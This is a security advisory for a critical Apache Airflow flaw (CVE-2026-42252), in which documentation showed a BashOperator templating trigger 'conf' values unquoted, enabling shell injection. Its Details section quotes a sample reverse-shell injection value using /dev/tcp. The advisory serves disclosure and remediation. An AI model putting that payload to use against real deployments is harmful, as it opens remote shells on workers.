# [C] Apache Airflow vulnerable to Improper Neutralization of Special Elements Used in a Template Engine

## Summary
Severity: Critical
Advisory: GHSA-c85c-g9wv-pph2
CVE: CVE-2026-42252
CWE: CWE-1336
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-01
Source: https://github.com/advisories/GHSA-c85c-g9wv-pph2
Type: github-advisory

## Affected
- PyPI: `apache-airflow` — affected >=3.0.0 <3.2.2

## Details
Apache Airflow's official documentation at `core-concepts/dag-run.html` ("Passing Parameters when triggering Dags") showed a verbatim `BashOperator(bash_command="echo value: {{ dag_run.conf['conf1'] }}")` example without any quoting / sanitization warning. Dag authors who copied the pattern verbatim into deployments where users had `Dag.can_trigger` permission on the affected Dag (typical multi-team deployments, hosted offerings exposing a trigger API) could be exposed to shell-metacharacter injection via the `conf` field of the trigger API: an authenticated trigger user could supply `"; bash -i >& /dev/tcp/.../9999 0>&1; #"` as a `conf` value and reach an `os.exec` on the worker. This CVE covers the documentation correction in `apache/airflow` PR 64129 — the pattern in the docs example now includes explicit shell-quoting and a safety caveat. Affects deployments whose Dag code was modeled on the pre-correction docs example. Same class as the prior CVE-2025-50213 and CVE-2025-27018 documentation-pattern fixes. Users are advised to upgrade to `apache-airflow` 3.2.2 or later to pick up the corrected documentation shipped with the release.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2026-42252
- https://github.com/apache/airflow/pull/64129
- https://github.com/apache/airflow
- https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-184.yaml
- https://lists.apache.org/thread/8f4sc0rfn154jprmnwtmlst4p9zfw3w7
